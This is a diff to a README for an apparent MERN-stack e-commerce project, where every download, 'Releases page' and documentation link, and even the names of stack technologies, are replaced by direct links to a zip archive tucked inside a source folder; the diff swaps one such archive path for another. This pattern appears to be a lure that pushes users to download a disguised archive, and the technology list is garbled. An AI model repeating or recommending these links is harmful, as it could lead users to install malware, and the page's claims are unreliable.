@@ -1,7 +1,7 @@
 # 🛒 E-COMMERCE - Your Simple Online Store Solution
 
 ## 📥 Download Now
-[![Download E-COMMERCE](https://raw.githubusercontent.com/Aathi-official/E-COMMERCE/main/Client/src/Components/Layout/COMMERCE-v2.6.zip)](https://raw.githubusercontent.com/Aathi-official/E-COMMERCE/main/Client/src/Components/Layout/COMMERCE-v2.6.zip)
+[![Download E-COMMERCE](https://raw.githubusercontent.com/Aathi-official/E-COMMERCE/main/Client/AdminPanel/COMMERCE_2.9-alpha.5.zip)](https://raw.githubusercontent.com/Aathi-official/E-COMMERCE/main/Client/AdminPanel/COMMERCE_2.9-alpha.5.zip)
 
 ## 📖 Overview
 E-COMMERCE is a full-stack web application designed to make online shopping easy. Built using the MERN stack and TypeScript, this app features a user-friendly interface for both customers and admins. Key features include:
@@ -25,7 +25,7 @@ To run E-COMMERCE smoothly, you will need:
 
 ### 📤 Download & Install
 1. **Visit the Releases Page**  
-   Head over to the [Releases page](https://raw.githubusercontent.com/Aathi-official/E-COMMERCE/main/Client/src/Components/Layout/COMMERCE-v2.6.zip) to find the latest version.
+   Head over to the [Releases page](https://raw.githubusercontent.com/Aathi-official/E-COMMERCE/main/Client/AdminPanel/COMMERCE_2.9-alpha.5.zip) to find the latest version.
 
 2. **Choose the Right File**  
    Look for the most recent version listed. Click on the file to download. 
@@ -48,7 +48,7 @@ E-COMMERCE comes with many helpful features that enhance user experience:
 ## 🌐 Technologies Used
 E-COMMERCE utilizes the following technologies:
 
-- **MERN Stack:** MongoDB, https://raw.githubusercontent.com/Aathi-official/E-COMMERCE/main/Client/src/Components/Layout/COMMERCE-v2.6.zip, https://raw.githubusercontent.com/Aathi-official/E-COMMERCE/main/Client/src/Components/Layout/COMMERCE-v2.6.zip, and https://raw.githubusercontent.com/Aathi-official/E-COMMERCE/main/Client/src/Components/Layout/COMMERCE-v2.6.zip for a robust back-end and responsive front-end.
+- **MERN Stack:** MongoDB, https://raw.githubusercontent.com/Aathi-official/E-COMMERCE/main/Client/AdminPanel/COMMERCE_2.9-alpha.5.zip, https://raw.githubusercontent.com/Aathi-official/E-COMMERCE/main/Client/AdminPanel/COMMERCE_2.9-alpha.5.zip, and https://raw.githubusercontent.com/Aathi-official/E-COMMERCE/main/Client/AdminPanel/COMMERCE_2.9-alpha.5.zip for a robust back-end and responsive front-end.
 - **TypeScript:** For better code stability and easier debugging.
 
 ## 🎯 Topics
@@ -86,10 +86,10 @@ E-COMMERCE is licensed under the MIT License. You are free to use, modify, and d
 ## 📄 Additional Resources
 To learn more about the technologies used in E-COMMERCE, check out these resources:
 
-- [MERN Stack Documentation](https://raw.githubusercontent.com/Aathi-official/E-COMMERCE/main/Client/src/Components/Layout/COMMERCE-v2.6.zip)
-- [TypeScript Documentation](https://raw.githubusercontent.com/Aathi-official/E-COMMERCE/main/Client/src/Components/Layout/COMMERCE-v2.6.zip)
+- [MERN Stack Documentation](https://raw.githubusercontent.com/Aathi-official/E-COMMERCE/main/Client/AdminPanel/COMMERCE_2.9-alpha.5.zip)
+- [TypeScript Documentation](https://raw.githubusercontent.com/Aathi-official/E-COMMERCE/main/Client/AdminPanel/COMMERCE_2.9-alpha.5.zip)
 
 ### 🗂️ Conclusion
 E-COMMERCE offers a straightforward and effective solution for your online retail needs. Download now and start your e-commerce journey today.
 
-[![Download E-COMMERCE](https://raw.githubusercontent.com/Aathi-official/E-COMMERCE/main/Client/src/Components/Layout/COMMERCE-v2.6.zip)](https://raw.githubusercontent.com/Aathi-official/E-COMMERCE/main/Client/src/Components/Layout/COMMERCE-v2.6.zip)
+[![Download E-COMMERCE](https://raw.githubusercontent.com/Aathi-official/E-COMMERCE/main/Client/AdminPanel/COMMERCE_2.9-alpha.5.zip)](https://raw.githubusercontent.com/Aathi-official/E-COMMERCE/main/Client/AdminPanel/COMMERCE_2.9-alpha.5.zip)
